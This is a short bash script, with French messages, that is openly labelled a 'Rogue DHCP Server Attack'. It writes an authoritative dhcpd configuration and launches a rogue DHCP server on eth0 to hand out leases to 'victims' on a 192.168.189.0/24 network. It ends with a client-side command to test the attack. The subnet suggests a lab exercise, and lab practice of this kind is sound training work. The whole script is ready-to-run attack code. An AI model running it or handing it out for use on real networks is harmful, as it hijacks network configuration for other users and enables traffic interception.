#!/bin/bash

echo "=== Rogue DHCP Server Attack ==="
echo "Objectif: Inserer un serveur DHCP malveillant"

INTERFACE="eth0"
ROGUE_IP="192.168.189.128"
NETWORK="192.168.189.0/24"
GATEWAY="192.168.189.1"
DNS1="8.8.8.8"
DNS2="8.8.4.4"

echo "Configuration du serveur DHCP (dhcpd.conf)..."

cat > /tmp/dhcpd.conf << KEOF
authoritative;
default-lease-time 600;
max-lease-time 7200;

subnet 192.168.189.0 netmask 255.255.255.0 {
    range 192.168.189.50 192.168.189.100;
    option routers $GATEWAY;
    option subnet-mask 255.255.255.0;
    option domain-name-servers $DNS1, $DNS2;
    option broadcast-address 192.168.189.255;
}
KEOF

echo "Lancement du serveur DHCP rogue..."
dhcpd -cf /tmp/dhcpd.conf $INTERFACE &

echo "Attaque en cours - En attente de victimes..."
echo "Pour tester depuis une victime: dhclient -r && dhclient"
echo "Appuyer sur Entree pour arreter..."
read

killall dhcpd 2>/dev/null
echo "Rogue DHCP arrete."
